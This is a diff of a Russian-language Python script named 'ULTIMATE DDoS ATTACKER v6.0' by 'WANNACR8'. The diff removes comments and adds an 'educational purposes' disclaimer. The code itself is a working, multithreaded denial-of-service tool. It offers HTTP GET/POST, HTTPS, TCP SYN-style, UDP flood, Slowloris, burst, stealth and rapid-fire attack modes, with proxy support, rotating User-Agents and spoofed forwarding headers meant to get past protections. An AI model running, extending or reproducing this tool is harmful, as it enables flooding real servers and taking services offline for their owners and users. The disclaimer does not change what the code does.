@@ -1,16 +1,3 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-
-"""
-================================================================================
-                          ULTIMATE DDoS CONSOLE ATTACKER
-================================================================================
-                           BY WANNACR8
-                           VERSION: 6.0 ULTIMATE
-                           DATE: 26.09.2025
-================================================================================
-"""
-
 import os
 import sys
 import time
@@ -21,22 +8,17 @@ import requests
 import json
 import urllib3
 import platform
-import subprocess
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
 from collections import deque
-import math
 
-# Отключаем SSL предупреждения
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# ========== БЕЛЫЙ ЦВЕТ (ВСЕ НАДПИСИ БЕЛЫЕ) ==========
 class Colors:
     WHITE = '\033[97m'
     BOLD = '\033[1m'
     END = '\033[0m'
     
-    # Используем только белый для текста
     HEADER = WHITE
     BLUE = WHITE
     CYAN = WHITE
@@ -45,7 +27,33 @@ class Colors:
     RED = WHITE
     MAGENTA = WHITE
 
-# ========== ПРОСТОЙ ЛОГОТИП ==========
+DISCLAIMER = f"""
+{Colors.WHITE}{Colors.BOLD}
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                                                                              ║
+║              СДЕЛАНО В ОБУЧАТЕЛЬНЫХ И ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЯХ                 ║
+║                                                                              ║
+║  Данный инструмент создан исключительно для:                                ║
+║  • Изучения принципов работы сетевых протоколов                             ║
+║  • Понимания механизмов DDoS атак                                           ║
+║  • Тестирования собственных серверов на устойчивость                        ║
+║  • Образовательных целей в области кибербезопасности                        ║
+║                                                                              ║
+║  Использование против серверов без разрешения владельца                     ║
+║  ЯВЛЯЕТСЯ НЕЗАКОННЫМ и преследуется по закону!                              ║
+║                                                                              ║
+║  Автор (WANNACR8) не несет ответственности за ваши действия                 ║
+║  и призывает использовать знания ТОЛЬКО в законных целях!                   ║
+║                                                                              ║
+║  Используя данный инструмент, вы подтверждаете, что:                        ║
+║  1. Вам есть 18+ лет                                                         ║
+║  2. Вы будете использовать его только на своих серверах                      ║
+║  3. Вы понимаете юридические последствия незаконного использования          ║
+║                                                                              ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+{Colors.END}
+"""
+
 LOGO = f"""
 {Colors.WHITE}{Colors.BOLD}
 ╔══════════════════════════════════════════════════════════════════════════════╗
@@ -60,7 +68,7 @@ LOGO = f"""
 ║    8888888888 888   T88b 888            888     8888888888 888              ║
 ║                                                                              ║
 ║                         BY WANNACR8                                         ║
-║                         ULTIMATE DDoS ATTACKER v6.0                         ║
+║              ULTIMATE DDoS ATTACKER v6.0 EDUCATIONAL                        ║
 ║                         26.09.2025                                           ║
 ║                                                                              ║
 ╚══════════════════════════════════════════════════════════════════════════════╝
@@ -89,49 +97,29 @@ class UltimateDDoSAttacker:
         self.workers = []
         self.proxies = []
         self.use_proxy = False
+        self.disclaimer_shown = False
         
-        # ========== УЛУЧШЕНИЯ ==========
-        self.user_agents = self.load_user_agents()
-        self.payloads = self.generate_payloads()
-        self.attack_patterns = self.init_attack_patterns()
-        
-    def load_user_agents(self):
-        """Загрузка реальных User-Agent"""
-        return [
-            # Windows
+        self.user_agents = [
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
-            
-            # Mac
             'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
             'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            
-            # Linux
             'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
-            
-            # Mobile
             'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
             'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-            
-            # Bots
             'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
             'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
             'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)'
         ]
         
-    def generate_payloads(self):
-        """Генерация полезной нагрузки для POST запросов"""
-        payloads = []
+        self.payloads = []
         for i in range(100):
             size = random.randint(512, 4096)
-            payloads.append(''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=size)))
-        return payloads
-        
-    def init_attack_patterns(self):
-        """Инициализация паттернов атаки"""
-        return {
+            self.payloads.append(''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=size)))
+            
+        self.attack_patterns = {
             'HTTP_GET': self.http_get_attack,
             'HTTP_POST': self.http_post_attack,
             'HTTPS': self.https_attack,
@@ -145,30 +133,30 @@ class UltimateDDoSAttacker:
         }
         
     def clear_screen(self):
-        """Очистка экрана"""
         os.system('cls' if os.name == 'nt' else 'clear')
         
+    def print_disclaimer(self):
+        self.clear_screen()
+        print(DISCLAIMER)
+        print(f"\n{Colors.WHITE}Нажмите ENTER чтобы подтвердить ознакомление и продолжить...{Colors.END}")
+        input()
+        self.disclaimer_shown = True
+        
     def print_header(self):
-        """Вывод заголовка"""
         self.clear_screen()
         print(LOGO)
         
     def get_cpu_cores(self):
-        """Получение количества ядер CPU с улучшенной информацией"""
         try:
             import multiprocessing
             cores = multiprocessing.cpu_count()
-            
-            # Дополнительная информация о системе
             system_info = f"{platform.system()} {platform.release()}"
             python_version = f"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}"
-            
             return cores, system_info, python_version
         except:
             return 4, "Unknown", "3.9"
             
     def show_menu(self):
-        """Улучшенное меню с белым текстом"""
         cores, system, python_ver = self.get_cpu_cores()
         
         print(f"{Colors.WHITE}╔════════════════════════════════════════════════════════════════════╗")
@@ -206,7 +194,6 @@ class UltimateDDoSAttacker:
         proxy_input = input(f"{Colors.WHITE}> {Colors.END}").strip().lower()
         self.use_proxy = proxy_input == 'y'
         
-        # ========== УЛУЧШЕННЫЙ ВЫБОР МЕТОДОВ ==========
         print(f"\n{Colors.WHITE}╔════════════════════════════════════════════════════════════════════╗")
         print(f"║                     ВЫБЕРИТЕ МЕТОД АТАКИ                        ║")
         print(f"╠════════════════════════════════════════════════════════════════════╣")
@@ -243,7 +230,6 @@ class UltimateDDoSAttacker:
         self.method = method_map.get(method_choice, 'HTTP_GET')
         
     def show_config(self):
-        """Показ конфигурации"""
         print(f"\n{Colors.WHITE}╔════════════════════════════════════════════════════════════════════╗")
         print(f"║                     КОНФИГУРАЦИЯ АТАКИ                         ║")
         print(f"╠════════════════════════════════════════════════════════════════════╣")
@@ -256,16 +242,14 @@ class UltimateDDoSAttacker:
         print(f"║  • Прокси: {'Да' if self.use_proxy else 'Нет':<58} ║")
         print(f"║                                                                    ║")
         print(f"║  BY WANNACR8                                                      ║")
+        print(f"║  СДЕЛАНО В ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЯХ                                  ║")
         print(f"║                                                                    ║")
         print(f"╚════════════════════════════════════════════════════════════════════╝{Colors.END}")
         
         print(f"\n{Colors.WHITE}[!] Нажмите ENTER для запуска атаки или Ctrl+C для отмены...{Colors.END}")
         input()
         
-    # ========== УЛУЧШЕННЫЕ МЕТОДЫ АТАК ==========
-    
     def http_get_attack(self):
-        """HTTP GET атака с оптимизацией"""
         session = requests.Session()
         adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
         session.mount('http://', adapter)
@@ -283,7 +267,6 @@ class UltimateDDoSAttacker:
                     'Pragma': 'no-cache'
                 }
                 
-                # Добавляем случайные заголовки для обхода защиты
                 if random.random() > 0.5:
                     headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                     headers['X-Real-IP'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
@@ -307,7 +290,6 @@ class UltimateDDoSAttacker:
                     self.stats['total'] += 1
                     
     def http_post_attack(self):
-        """HTTP POST атака с большими данными"""
         session = requests.Session()
         
         while self.attacking and not self.paused:
@@ -339,7 +321,6 @@ class UltimateDDoSAttacker:
                     self.stats['total'] += 1
                     
     def https_attack(self):
-        """HTTPS атака с поддержкой SSL"""
         session = requests.Session()
         
         while self.attacking and not self.paused:
@@ -361,7 +342,6 @@ class UltimateDDoSAttacker:
                     self.stats['total'] += 1
                     
     def tcp_syn_attack(self):
-        """TCP SYN атака"""
         while self.attacking and not self.paused:
             try:
                 host = self.target.replace('http://', '').replace('https://', '').split('/')[0]
@@ -380,7 +360,6 @@ class UltimateDDoSAttacker:
                     self.stats['total'] += 1
                     
     def udp_flood_attack(self):
-        """UDP флуд"""
         while self.attacking and not self.paused:
             try:
                 host = self.target.replace('http://', '').replace('https://', '').split('/')[0]
@@ -400,19 +379,16 @@ class UltimateDDoSAttacker:
                     self.stats['total'] += 1
                     
     def slowloris_attack(self):
-        """Slowloris - держит соединения открытыми"""
         while self.attacking and not self.paused:
             try:
                 host = self.target.replace('http://', '').replace('https://', '').split('/')[0]
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.connect((host, self.port))
                 
-                # Отправляем частичный запрос
                 sock.send(f"GET /{random.randint(1,9999)} HTTP/1.1\r\n".encode())
                 sock.send(f"Host: {host}\r\n".encode())
                 sock.send(f"User-Agent: {random.choice(self.user_agents)}\r\n".encode())
                 
-                # Держим соединение, отправляя случайные заголовки
                 for _ in range(random.randint(5, 10)):
                     if not self.attacking or self.paused:
                         break
@@ -431,13 +407,11 @@ class UltimateDDoSAttacker:
                     self.stats['total'] += 1
                     
     def mixed_attack(self):
-        """Комбинация всех методов"""
         attacks = [self.http_get_attack, self.http_post_attack, self.tcp_syn_attack, 
                   self.udp_flood_attack, self.slowloris_attack]
         random.choice(attacks)()
         
     def rapid_fire_attack(self):
-        """Очень быстрая атака без задержек"""
         session = requests.Session()
         
         while self.attacking and not self.paused:
@@ -459,7 +433,6 @@ class UltimateDDoSAttacker:
                     self.stats['total'] += 1
                     
     def stealth_attack(self):
-        """Скрытная атака с задержками"""
         session = requests.Session()
         
         while self.attacking and not self.paused:
@@ -475,7 +448,6 @@ class UltimateDDoSAttacker:
                         self.stats['failed'] += 1
                     self.stats['bytes'] += len(r.content)
                     
-                # Случайная задержка для скрытности
                 time.sleep(random.uniform(0.5, 2))
                 
             except:
@@ -484,7 +456,6 @@ class UltimateDDoSAttacker:
                     self.stats['total'] += 1
                     
     def burst_attack(self):
-        """Атака импульсами"""
         burst_size = random.randint(10, 50)
         burst_count = 0
         
@@ -505,7 +476,6 @@ class UltimateDDoSAttacker:
                 burst_count += 1
                 
                 if burst_count >= burst_size:
-                    # Пауза между импульсами
                     time.sleep(random.uniform(1, 3))
                     burst_size = random.randint(10, 50)
                     burst_count = 0
@@ -516,7 +486,6 @@ class UltimateDDoSAttacker:
                     self.stats['total'] += 1
                     
     def show_stats(self):
-        """Улучшенная статистика с белым текстом"""
         last_total = 0
         last_time = time.time()
         
@@ -526,7 +495,6 @@ class UltimateDDoSAttacker:
             
             elapsed = time.time() - self.stats['start_time']
             
-            # Расчет скорости
             current_time = time.time()
             time_diff = current_time - last_time
             if time_diff > 0:
@@ -541,10 +509,8 @@ class UltimateDDoSAttacker:
             avg_speed = self.stats['total'] / elapsed if elapsed > 0 else 0
             success_rate = (self.stats['success'] / max(self.stats['total'], 1)) * 100
             
-            # Расчет среднего времени ответа
             avg_response = sum(self.stats['response_times']) / max(len(self.stats['response_times']), 1)
             
-            # Прогресс бар
             if self.duration > 0:
                 progress = min(100, (elapsed / self.duration) * 100)
                 bar_length = 50
@@ -556,7 +522,6 @@ class UltimateDDoSAttacker:
                 progress = 0
                 time_display = f"{elapsed:.1f}/∞"
                 
-            # ETA расчет
             if self.duration > 0 and elapsed > 0:
                 eta = max(0, self.duration - elapsed)
                 eta_display = f"{eta:.1f} сек"
@@ -598,8 +563,9 @@ class UltimateDDoSAttacker:
 ║                                                                              ║
 ║  ╔════════════════════════════════════════════════════════════════════════╗  ║
 ║  ║                         BY WANNACR8                                    ║  ║
-║  ║                 ULTIMATE DDoS ATTACKER v6.0                           ║  ║
+║  ║              ULTIMATE DDoS ATTACKER v6.0 EDUCATIONAL                  ║  ║
 ║  ║                         26.09.2025                                     ║  ║
+║  ║              СДЕЛАНО В ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЯХ                          ║  ║
 ║  ╚════════════════════════════════════════════════════════════════════════╝  ║
 ║                                                                              ║
 ║  [КОМАНДЫ] P - Пауза | R - Возобновить | S - Статистика | Q - Выход         ║
@@ -607,26 +573,9 @@ class UltimateDDoSAttacker:
 ╚══════════════════════════════════════════════════════════════════════════════╝
 {Colors.END}""")
             
-            # Проверка ввода без блокировки
             time.sleep(0.5)
             
-    def check_commands(self):
-        """Проверка команд во время атаки"""
-        import msvcrt
-        if msvcrt.kbhit():
-            key = msvcrt.getch().decode().lower()
-            if key == 'p':
-                self.paused = not self.paused
-                return f"{'Пауза' if self.paused else 'Продолжение'} атаки"
-            elif key == 's':
-                return "Статистика обновлена"
-            elif key == 'q':
-                self.attacking = False
-                return "Выход..."
-        return None
-        
     def start_attack(self):
-        """Запуск атаки с улучшенным управлением"""
         self.attacking = True
         self.paused = False
         self.stats['start_time'] = time.time()
@@ -635,7 +584,6 @@ class UltimateDDoSAttacker:
         print(f"{Colors.WHITE}[!] Нажмите P для паузы, R для возобновления, Q для выхода{Colors.END}")
         time.sleep(2)
         
-        # Запуск рабочих потоков
         attack_method = self.attack_patterns.get(self.method, self.http_get_attack)
         
         for i in range(self.threads):
@@ -644,27 +592,17 @@ class UltimateDDoSAttacker:
             t.start()
             self.workers.append(t)
             
-        # Запуск статистики
         stats_thread = threading.Thread(target=self.show_stats)
         stats_thread.daemon = True
         stats_thread.start()
         
-        # Мониторинг команд
         try:
             if self.duration > 0:
                 end_time = time.time() + self.duration
                 while self.attacking and time.time() < end_time:
-                    if hasattr(self, 'check_commands'):
-                        cmd_result = self.check_commands()
-                        if cmd_result:
-                            pass
                     time.sleep(0.1)
             else:
                 while self.attacking:
-                    if hasattr(self, 'check_commands'):
-                        cmd_result = self.check_commands()
-                        if cmd_result:
-                            pass
                     time.sleep(0.1)
         except KeyboardInterrupt:
             pass
@@ -672,7 +610,6 @@ class UltimateDDoSAttacker:
             self.stop_attack()
             
     def stop_attack(self):
-        """Остановка атаки с финальной статистикой"""
         self.attacking = False
         elapsed = time.time() - self.stats['start_time']
         
@@ -705,8 +642,9 @@ class UltimateDDoSAttacker:
 ║                                                                              ║
 ║  ╔════════════════════════════════════════════════════════════════════════╗  ║
 ║  ║                         BY WANNACR8                                    ║  ║
-║  ║                 ULTIMATE DDoS ATTACKER v6.0                           ║  ║
+║  ║              ULTIMATE DDoS ATTACKER v6.0 EDUCATIONAL                  ║  ║
 ║  ║                         26.09.2025                                     ║  ║
+║  ║              СДЕЛАНО В ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЯХ                          ║  ║
 ║  ╚════════════════════════════════════════════════════════════════════════╝  ║
 ║                                                                              ║
 ║              СПАСИБО ЗА ИСПОЛЬЗОВАНИЕ ИНСТРУМЕНТА WANNACR8!                  ║
@@ -717,7 +655,9 @@ class UltimateDDoSAttacker:
         input(f"\n{Colors.WHITE}Нажмите ENTER для выхода...{Colors.END}")
         
     def run(self):
-        """Запуск программы"""
+        if not self.disclaimer_shown:
+            self.print_disclaimer()
+        
         try:
             self.print_header()
             self.show_menu()
@@ -729,7 +669,6 @@ class UltimateDDoSAttacker:
             print(f"\n{Colors.WHITE}Ошибка: {e}{Colors.END}")
             time.sleep(2)
 
-# ========== ЗАПУСК ==========
 if __name__ == "__main__":
     attacker = UltimateDDoSAttacker()
     attacker.run()
